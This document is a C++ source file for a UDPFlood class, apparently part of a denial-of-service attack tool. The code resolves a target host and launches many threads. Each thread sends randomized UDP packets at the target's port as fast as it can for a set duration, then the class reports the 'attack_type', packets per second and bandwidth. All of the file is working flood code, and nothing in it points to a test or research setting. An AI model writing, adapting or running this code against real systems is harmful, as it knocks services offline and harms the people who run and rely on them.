#include "udp_flood.hpp"
#include "config.hpp"

#include <sstream>
#include <cstring>
#include <algorithm>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
    typedef int socklen_t;
    #define CLOSE_SOCKET closesocket
#else
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <unistd.h>
    #define SOCKET int
    #define INVALID_SOCKET (-1)
    #define CLOSE_SOCKET ::close
#endif

UDPFlood::UDPFlood(const std::string& target, int duration, int threads, int port,
                   int payload_size,
                   std::function<void(const std::string&)> callback)
    : target_(target)
    , duration_(duration)
    , num_threads_(threads)
    , port_(port)
    , payload_size_(std::min(payload_size, MAX_PAYLOAD_SIZE))
    , callback_(callback)
{
}

UDPFlood::~UDPFlood() {
    stop();
}

std::string UDPFlood::resolve_host(const std::string& hostname) {
    struct addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;

    if (getaddrinfo(hostname.c_str(), nullptr, &hints, &res) != 0 || !res) {
        return "";
    }

    char ip[INET_ADDRSTRLEN];
    auto* addr = reinterpret_cast<struct sockaddr_in*>(res->ai_addr);
    inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
    freeaddrinfo(res);
    return std::string(ip);
}

void UDPFlood::worker(int /*worker_id*/) {
    std::string ip = resolve_host(target_);
    if (ip.empty()) {
        failed_packets_++;
        return;
    }

    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        failed_packets_++;
        return;
    }

    struct sockaddr_in server{};
    server.sin_family = AF_INET;
    server.sin_port = htons(static_cast<uint16_t>(port_));
    inet_pton(AF_INET, ip.c_str(), &server.sin_addr);

    // Generate random payload
    thread_local std::mt19937 rng(std::random_device{}());
    std::uniform_int_distribution<int> byte_dist(0, 255);

    std::vector<char> payload(payload_size_);

    while (!stop_flag_.load()) {
        // Randomize payload each send
        for (int i = 0; i < payload_size_; i++) {
            payload[i] = static_cast<char>(byte_dist(rng));
        }

        int result = sendto(sock, payload.data(), payload_size_, 0,
                           (struct sockaddr*)&server, sizeof(server));

        if (result > 0) {
            packets_sent_++;
            bytes_sent_ += static_cast<uint64_t>(result);
        } else {
            failed_packets_++;
        }
    }

    CLOSE_SOCKET(sock);
}

std::map<std::string, std::string> UDPFlood::run() {
    stop_flag_.store(false);
    packets_sent_.store(0);
    bytes_sent_.store(0);
    failed_packets_.store(0);

    if (callback_) {
        callback_("Starting UDP Flood on " + target_ + ":" + std::to_string(port_) +
                  " (payload: " + std::to_string(payload_size_) + " bytes)");
    }

    auto start_time = std::chrono::steady_clock::now();

    // Launch worker threads
    for (int i = 0; i < num_threads_; i++) {
        threads_.emplace_back(&UDPFlood::worker, this, i);
    }

    // Monitor duration
    while (!stop_flag_.load()) {
        auto elapsed = std::chrono::steady_clock::now() - start_time;
        if (std::chrono::duration_cast<std::chrono::seconds>(elapsed).count() >= duration_) {
            stop_flag_.store(true);
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    // Join threads
    for (auto& t : threads_) {
        if (t.joinable()) t.join();
    }
    threads_.clear();

    auto end_time = std::chrono::steady_clock::now();
    auto total_seconds = std::chrono::duration_cast<std::chrono::seconds>(end_time - start_time).count();
    if (total_seconds == 0) total_seconds = 1;

    uint64_t sent = packets_sent_.load();
    uint64_t bytes = bytes_sent_.load();
    uint64_t failed = failed_packets_.load();

    // Format bytes
    auto format_bytes = [](uint64_t b) -> std::string {
        if (b >= 1073741824ULL) {
            return std::to_string(b / 1073741824ULL) + "." +
                   std::to_string((b % 1073741824ULL) * 10 / 1073741824ULL) + " GB";
        } else if (b >= 1048576ULL) {
            return std::to_string(b / 1048576ULL) + "." +
                   std::to_string((b % 1048576ULL) * 10 / 1048576ULL) + " MB";
        } else if (b >= 1024ULL) {
            return std::to_string(b / 1024ULL) + "." +
                   std::to_string((b % 1024ULL) * 10 / 1024ULL) + " KB";
        }
        return std::to_string(b) + " B";
    };

    std::map<std::string, std::string> stats;
    stats["attack_type"] = "UDP Flood";
    stats["target"] = target_ + ":" + std::to_string(port_);
    stats["duration"] = std::to_string(total_seconds) + "s";
    stats["threads"] = std::to_string(num_threads_);
    stats["payload_size"] = std::to_string(payload_size_) + " bytes";
    stats["packets_sent"] = std::to_string(sent);
    stats["bytes_sent"] = format_bytes(bytes);
    stats["failed_packets"] = std::to_string(failed);
    stats["packets_per_second"] = std::to_string(sent / static_cast<uint64_t>(total_seconds));
    stats["bandwidth"] = format_bytes(bytes / static_cast<uint64_t>(total_seconds)) + "/s";

    return stats;
}

void UDPFlood::stop() {
    stop_flag_.store(true);
    for (auto& t : threads_) {
        if (t.joinable()) t.join();
    }
    threads_.clear();
}
